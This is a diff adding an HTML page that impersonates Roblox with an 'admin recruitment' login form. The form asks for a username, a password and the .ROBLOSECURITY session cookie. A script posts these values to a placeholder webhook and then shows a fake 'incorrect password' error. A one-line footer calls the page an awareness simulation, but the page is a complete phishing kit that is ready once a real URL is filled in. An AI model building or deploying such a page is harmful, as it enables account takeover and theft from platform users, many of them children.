@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Admin Panel</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
+  <style>
+    body {
+      margin: 0;
+      background-color: #f2f2f2;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .header {
+      background-color: #232527;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+    }
+
+    .header img {
+      height: 32px;
+    }
+
+    .hero {
+      background: url('https://images.ctfassets.net/0b815kqjt7rr/6CSH5ZLZCakGZdfqkzbDNs/4d2ac74f70106de81a0b58db1b7f62a0/Roblox_Experience_Splash.jpg') no-repeat center center;
+      background-size: cover;
+      height: 250px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 32px;
+      font-weight: bold;
+      letter-spacing: 2px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .container h2 {
+      margin-bottom: 10px;
+      color: #232527;
+    }
+
+    .container p {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .button {
+      background-color: #ff3c00;
+      border: none;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      display: none;
+      margin-top: 10px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="https://www.roblox.com/images/Logo.png" alt="Roblox Logo" />
+  </div>
+
+  <div class="hero">
+    ROBLOX ADMIN
+  </div>
+
+  <div class="container">
+    <h2>Become an Admin</h2>
+    <p>We’re recruiting future Admins to help us improve the platform!</p>
+    <form onsubmit="sendData(); return false;">
+      <input type="text" id="username" placeholder="Username" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <input type="text" id="cookie" placeholder=".ROBLOSECURITY (optional)" />
+      <button type="submit" class="button">Log In</button>
+    </form>
+    <div class="error" id="errorMsg">Username or password is incorrect.</div>
+  </div>
+
+  <div class="footer">
+    This is a simulation for cybersecurity awareness testing.
+  </div>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const cookie = document.getElementById("cookie").value;
+
+      fetch("https://your-webhook-url-here", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `Phishing Simulation Log:\nUsername: ${username}\nPassword: ${password}\nCookie: ${cookie}`
+        })
+      });
+
+      document.getElementById("errorMsg").style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
